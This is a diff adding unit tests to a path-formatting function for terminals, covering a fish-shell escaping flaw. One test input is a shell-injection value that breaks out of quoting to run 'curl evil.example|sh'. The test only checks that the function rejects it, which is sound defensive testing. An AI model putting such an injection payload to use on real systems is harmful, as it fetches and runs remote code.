@@ -20,6 +20,21 @@ describe('formatWorkspacePathForTerminal', () => {
     )
   })
 
+  // LEV-387: fish reads \' and \\ as escapes inside single quotes, so this
+  // name would end the quoting early there and run curl … | sh.
+  test('rejects a backslash off Windows, which fish reads as an escape', () => {
+    expect(() =>
+      formatWorkspacePathForTerminal('/repo/x\\\'";curl evil.example|sh;#'),
+    ).toThrow('backslash')
+    expect(() => formatWorkspacePathForTerminal('/repo/a\\b.md')).toThrow('backslash')
+  })
+
+  test('keeps a Windows path with its backslashes', () => {
+    expect(
+      formatWorkspacePathForTerminal('C:\\Users\\me\\read me.md', { windows: true }),
+    ).toBe("'C:\\Users\\me\\read me.md' ")
+  })
+
   test('rejects NUL instead of writing a truncated path to the terminal', () => {
     expect(() => formatWorkspacePathForTerminal('/tmp/safe\0hidden')).toThrow(
       'control',
